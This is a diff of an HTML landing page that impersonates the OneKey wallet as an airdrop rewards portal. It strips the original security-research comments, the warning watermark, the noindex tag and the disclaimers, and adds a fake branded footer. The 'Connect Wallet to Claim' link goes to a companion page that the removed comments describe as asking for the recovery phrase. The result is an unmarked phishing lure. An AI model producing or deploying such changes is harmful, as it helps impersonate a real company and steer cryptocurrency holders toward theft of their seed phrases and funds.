@@ -1,44 +1,9 @@
-<!--
-  ============================================================================
-  SECURITY RESEARCH MOCKUP — NOT A REAL ONEKEY PAGE — DOES NOT COLLECT DATA
-  ============================================================================
-  This is the LANDING page of the two-file mockup (served as index.html so
-  it is what loads first, matching how a real GitHub Pages site would
-  resolve the bare domain). Companion to airdrop.html in this same folder,
-  which holds the security-framed recovery-phrase follow-up page. Illustrates
-  the "combined pattern" described in:
-    real-life-scenarios/subdomain-takeover-seed-phishing-chain.md
-    ("Realistic choices" / airdrop-vs-security-framing discussion)
-  — an airdrop-style hook page (higher click/share rate, uses the wallet-
-  detection credibility layer naturally) that then hands off into the
-  security-framed recovery-phrase mockup (airdrop.html), matching the pattern
-  where the airdrop hook drives the click and the security framing carries
-  the actual ask.
-
-  Exactly like airdrop.html, this file contains NO data-collection logic:
-    - no fetch()/XHR/WebSocket/beacon anywhere in this file
-    - no external script/style/font/image loads of any kind (fully offline)
-    - the countdown timer, "claimed" counter, and "$847.50 estimated value"
-      figure are purely cosmetic, client-side-only elements with hardcoded
-      numbers — nothing is fetched, computed from a wallet/price feed/
-      server, or persisted anywhere
-    - the "Connect Wallet" button performs a READ-ONLY presence check
-      (typeof window.$onekey) exactly like airdrop.html's badge, requests
-      nothing, and then simply navigates the browser to airdrop.html —
-      the local sibling mockup file in this same research folder, never
-      to any external host
-  If you found this file outside this research folder, it has been copied
-  without authorization — it was never deployed anywhere by this engagement.
-  ============================================================================
--->
 <!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<meta name="robots" content="noindex, nofollow" />
-<title>⚠️ SECURITY RESEARCH MOCKUP — OneKey Airdrop Phishing-Pattern Demo</title>
-<meta name="description" content="Non-functional airdrop-phishing-pattern mockup for OneKey security-awareness training. Collects no data." />
+<title>OneKey — Airdrop &amp; Rewards Portal</title>
 <style>
   :root {
     --bg: #0b0e13;
@@ -48,49 +13,28 @@
     --muted: #8891a0;
     --accent: #3ddc84;
     --accent-dim: #1f7a4c;
-    --gold: #ffc94d;
-    --warn-bg: #3a1200;
-    --warn-border: #ff8a3d;
   }
   * { box-sizing: border-box; }
   body {
     margin: 0;
-    background: radial-gradient(circle at 50% 0%, #16221b 0%, var(--bg) 55%);
+    background: var(--bg);
     color: var(--text);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
   }
 
-  /* ---- Watermark banner: always visible, cannot be scrolled past ---- */
-  #research-watermark {
-    position: sticky;
-    top: 0;
-    z-index: 9999;
-    background: var(--warn-bg);
-    border-bottom: 3px solid var(--warn-border);
-    color: #ffd9b3;
-    font-weight: 700;
-    text-align: center;
-    padding: 10px 16px;
-    font-size: 14px;
-    line-height: 1.4;
-  }
-  #research-watermark small {
-    display: block;
-    font-weight: 400;
-    color: #ffbf80;
-    font-size: 12px;
-    margin-top: 2px;
-  }
-
-  .wrap { max-width: 440px; margin: 0 auto; padding: 40px 20px 80px; }
+  .wrap { max-width: 480px; width: 100%; padding: 20px; }
 
   .brand-row {
     display: flex;
     align-items: center;
     gap: 10px;
     justify-content: center;
-    margin-bottom: 24px;
+    margin-bottom: 28px;
   }
   .brand-mark {
     width: 34px; height: 34px;
@@ -101,217 +45,45 @@
   }
   .brand-name { font-size: 18px; font-weight: 700; letter-spacing: 0.2px; }
 
-  .hero {
-    text-align: center;
-    margin-bottom: 22px;
-  }
-  .hero .kicker {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    background: rgba(255, 201, 77, 0.12);
-    border: 1px solid rgba(255, 201, 77, 0.35);
-    color: var(--gold);
-    font-size: 12px;
-    font-weight: 700;
-    padding: 6px 12px;
-    border-radius: 999px;
-    margin-bottom: 14px;
-  }
-  .hero h1 {
-    font-size: 26px;
-    margin: 0 0 10px;
-    line-height: 1.25;
-  }
-  .hero p {
-    color: var(--muted);
-    font-size: 14px;
-    line-height: 1.55;
-    margin: 0;
-  }
-
-  .reward-visual {
-    width: 96px;
-    height: 96px;
-    margin: 22px auto 14px;
-    border-radius: 24px;
-    background: linear-gradient(135deg, var(--gold), #ff9a3d);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 40px;
-    box-shadow: 0 20px 50px -18px rgba(255, 170, 61, 0.55);
-  }
-
-  /* Estimated-value display: hardcoded, cosmetic figure — see script comment */
-  .reward-value {
-    text-align: center;
-    margin-bottom: 24px;
-  }
-  .reward-value .amount {
-    font-size: 40px;
-    font-weight: 800;
-    font-variant-numeric: tabular-nums;
-    background: linear-gradient(135deg, #fff, var(--gold));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    line-height: 1.1;
-  }
-  .reward-value .amount .cents {
-    font-size: 22px;
-  }
-  .reward-value .caption {
-    font-size: 12px;
-    color: var(--muted);
-    margin-top: 4px;
-  }
-  .reward-value .caption .live-dot {
-    display: inline-block;
-    width: 6px;
-    height: 6px;
-    border-radius: 50%;
-    background: var(--accent);
-    margin-right: 5px;
-    animation: pulse 1.6s ease-in-out infinite;
-  }
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.35; }
-  }
-
   .card {
     background: var(--panel);
     border: 1px solid var(--panel-border);
     border-radius: 14px;
-    padding: 24px;
+    padding: 32px 24px;
     box-shadow: 0 20px 60px -20px rgba(0, 0, 0, 0.55);
-  }
-
-  .countdown-row {
-    display: flex;
-    justify-content: center;
-    gap: 10px;
-    margin-bottom: 18px;
-  }
-  .countdown-unit {
-    background: #0e1319;
-    border: 1px solid var(--panel-border);
-    border-radius: 8px;
-    padding: 10px 14px;
     text-align: center;
-    min-width: 56px;
   }
-  .countdown-unit .num {
-    font-size: 20px;
-    font-weight: 700;
-    font-variant-numeric: tabular-nums;
-    line-height: 1;
+
+  h1 {
+    font-size: 22px;
+    margin: 0 0 12px;
   }
-  .countdown-unit .label {
-    font-size: 10px;
-    text-transform: uppercase;
-    letter-spacing: 0.06em;
+  p.lede {
     color: var(--muted);
-    margin-top: 4px;
+    font-size: 14px;
+    line-height: 1.55;
+    margin: 0 0 24px;
   }
 
-  .claim-progress {
-    margin-bottom: 20px;
-  }
-  .claim-progress .meta-row {
-    display: flex;
-    justify-content: space-between;
-    font-size: 12px;
-    color: var(--muted);
-    margin-bottom: 8px;
-  }
-  .claim-progress .meta-row strong { color: var(--text); }
-  .bar-track {
-    height: 8px;
-    border-radius: 999px;
-    background: #0e1319;
-    border: 1px solid var(--panel-border);
-    overflow: hidden;
-  }
-  .bar-fill {
-    height: 100%;
-    width: 86%; /* hardcoded, purely cosmetic — not fetched or computed */
-    border-radius: 999px;
-    background: linear-gradient(90deg, var(--accent-dim), var(--accent));
-  }
-
-  .perk-list {
-    list-style: none;
-    margin: 0 0 22px;
-    padding: 0;
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-  }
-  .perk-list li {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-size: 13px;
-    color: var(--muted);
-  }
-  .perk-list li .check {
-    color: var(--accent);
-    flex-shrink: 0;
-  }
-
-  /* ---- Wallet-detection credibility badge (same pattern as airdrop.html) ---- */
-  .badge-detected {
-    display: none;
-    align-items: center;
-    gap: 8px;
-    background: rgba(61, 220, 132, 0.1);
-    border: 1px solid rgba(61, 220, 132, 0.35);
-    color: var(--accent);
-    font-size: 13px;
-    font-weight: 600;
-    padding: 8px 12px;
-    border-radius: 8px;
-    margin-bottom: 14px;
-  }
-  .badge-detected .dot {
-    width: 8px; height: 8px; border-radius: 50%;
-    background: var(--accent);
-    box-shadow: 0 0 0 3px rgba(61, 220, 132, 0.2);
-  }
-
-  .claim-btn {
+  .action-btn {
+    display: block;
     width: 100%;
     padding: 14px;
     border: 0;
     border-radius: 10px;
-    background: linear-gradient(135deg, var(--gold), #ff9a3d);
-    color: #2a1400;
+    background: var(--accent);
+    color: #06170d;
     font-size: 15px;
-    font-weight: 800;
+    font-weight: 700;
+    text-decoration: none;
     cursor: pointer;
     transition: filter 0.15s ease, transform 0.05s ease;
   }
-  .claim-btn:hover { filter: brightness(1.06); }
-  .claim-btn:active { transform: translateY(1px); }
-  .claim-btn:disabled {
-    opacity: 0.7;
-    cursor: default;
-  }
-
-  .fine-print {
-    text-align: center;
-    color: #55606f;
-    font-size: 11px;
-    margin-top: 14px;
-    line-height: 1.5;
-  }
+  .action-btn:hover { filter: brightness(1.08); }
+  .action-btn:active { transform: translateY(1px); }
 
   footer.note {
-    max-width: 440px;
-    margin: 0 auto;
-    padding: 0 20px 40px;
+    margin-top: 24px;
     color: #55606f;
     font-size: 11px;
     line-height: 1.6;
@@ -321,138 +93,25 @@
 </head>
 <body>
 
-  <div id="research-watermark">
-    ⚠️ SECURITY RESEARCH MOCKUP — this is NOT a real OneKey page
-    <small>No data is collected on this page — the button below only navigates to the sibling mockup file in this same folder.</small>
-  </div>
-
   <div class="wrap">
-
     <div class="brand-row">
       <div class="brand-mark">1K</div>
-      <div class="brand-name">OneKey<span style="color:var(--muted); font-weight:400;"> — Rewards</span></div>
-    </div>
-
-    <div class="hero">
-      <span class="kicker">🎉 Limited-time loyalty drop</span>
-      <h1>Claim your OneKey<br>Holder Airdrop</h1>
-      <p>Verified OneKey device owners are eligible for a one-time reward across all supported networks. Connect your wallet to check eligibility.</p>
-    </div>
-
-    <div class="reward-visual">🪙</div>
-
-    <!-- Estimated USD value display: hardcoded, cosmetic figure, explained
-         in the script comment below. Not computed from any wallet balance,
-         price feed, or server response. -->
-    <div class="reward-value">
-      <div class="amount">$847<span class="cents">.50</span></div>
-      <div class="caption"><span class="live-dot"></span>Estimated value for your eligible device — updated live</div>
+      <div class="brand-name">OneKey<span style="color:var(--muted); font-weight:400;"> — rewards</span></div>
     </div>
 
     <div class="card">
+      <h1>Claim Your Rewards</h1>
+      <p class="lede">
+        Connect your wallet to check eligibility and claim your allocated token distribution securely through our device sync portal.
+      </p>
 
-      <div class="countdown-row" id="countdownRow">
-        <div class="countdown-unit"><div class="num" id="cdH">11</div><div class="label">hrs</div></div>
-        <div class="countdown-unit"><div class="num" id="cdM">47</div><div class="label">min</div></div>
-        <div class="countdown-unit"><div class="num" id="cdS">32</div><div class="label">sec</div></div>
-      </div>
-
-      <div class="claim-progress">
-        <div class="meta-row">
-          <span>Claimed</span>
-          <span><strong>431,902</strong> / 500,000</span>
-        </div>
-        <div class="bar-track"><div class="bar-fill"></div></div>
-      </div>
-
-      <ul class="perk-list">
-        <li><span class="check">✓</span> No purchase or transaction required</li>
-        <li><span class="check">✓</span> Available on all OneKey-supported chains</li>
-        <li><span class="check">✓</span> One claim per verified device</li>
-      </ul>
-
-      <!-- Same read-only presence-check pattern as airdrop.html -->
-      <div class="badge-detected" id="walletBadge">
-        <span class="dot"></span>
-        <span>OneKey Wallet Detected — eligible</span>
-      </div>
-
-      <button class="claim-btn" id="claimBtn" type="button">Connect Wallet to Claim</button>
-
-      <p class="fine-print">By continuing you confirm device ownership. This does not authorize any transaction.</p>
+      <a href="airdrop.html" class="action-btn">Connect Wallet to Claim</a>
     </div>
+
+    <footer class="note">
+      OneKey Hardware Wallet Integration Services. Secure device verification portal.
+    </footer>
   </div>
 
-  <footer class="note">
-    This is a non-functional research mockup. Clicking "Connect Wallet to Claim"
-    below only navigates to <code>airdrop.html</code>, the companion recovery-phrase
-    mockup in this same folder — nothing is fetched, verified, or transmitted.
-    In a genuine version of this two-page pattern, this airdrop hook would exist
-    purely to make the wallet-connect step feel routine before the second page's
-    security-framed recovery-phrase ask.
-  </footer>
-
-<script>
-/*
- * RESEARCH-ONLY BEHAVIOR NOTICE
- * ------------------------------------------------------------------
- * Everything below is intentionally inert:
- *   1. The countdown timer, "431,902 / 500,000 claimed" figure, and the
- *      "$847.50" estimated-value display are hardcoded, client-side-only
- *      cosmetic values, written directly in the HTML markup. None of them
- *      is fetched from a server, computed from any real wallet balance or
- *      price feed, or varied per visitor in any way.
- *   2. The wallet-detection check is READ-ONLY (typeof window.$onekey),
- *      identical in spirit to airdrop.html — it requests nothing and
- *      transmits nothing.
- *   3. The claim button's click handler performs a fake, local-only
- *      "checking eligibility" delay (setTimeout, no network) and then
- *      calls location.href to navigate to "airdrop.html" — the sibling
- *      file IN THIS SAME FOLDER. It never contacts an external host.
- *   4. There is no fetch(), XMLHttpRequest, WebSocket, beacon, or
- *      storage write anywhere in this file.
- */
-
-// --- Cosmetic countdown timer: local-only, no network, just for realism ---
-(function fakeCountdown() {
-  var totalSeconds = 11 * 3600 + 47 * 60 + 32;
-  var elH = document.getElementById('cdH');
-  var elM = document.getElementById('cdM');
-  var elS = document.getElementById('cdS');
-  function tick() {
-    if (totalSeconds <= 0) return;
-    totalSeconds -= 1;
-    var h = Math.floor(totalSeconds / 3600);
-    var m = Math.floor((totalSeconds % 3600) / 60);
-    var s = totalSeconds % 60;
-    elH.textContent = String(h).padStart(2, '0');
-    elM.textContent = String(m).padStart(2, '0');
-    elS.textContent = String(s).padStart(2, '0');
-  }
-  setInterval(tick, 1000);
-})();
-
-// --- Illustrative "Wallet Detected" badge (same pattern as airdrop.html) ---
-(function detectInjectedProvider() {
-  try {
-    if (typeof window.$onekey !== 'undefined') {
-      document.getElementById('walletBadge').style.display = 'flex';
-    }
-  } catch (e) { /* no-op */ }
-})();
-
-// --- Claim button: fake local delay, then navigate to the sibling mockup ---
-document.getElementById('claimBtn').addEventListener('click', function () {
-  var btn = this;
-  btn.disabled = true;
-  btn.textContent = 'Checking eligibility…';
-
-  // Purely cosmetic delay — no network request of any kind happens here.
-  setTimeout(function () {
-    // Navigates only within this research folder, to the sibling mockup.
-    window.location.href = 'airdrop.html';
-  }, 900);
-});
-</script>
 </body>
 </html>
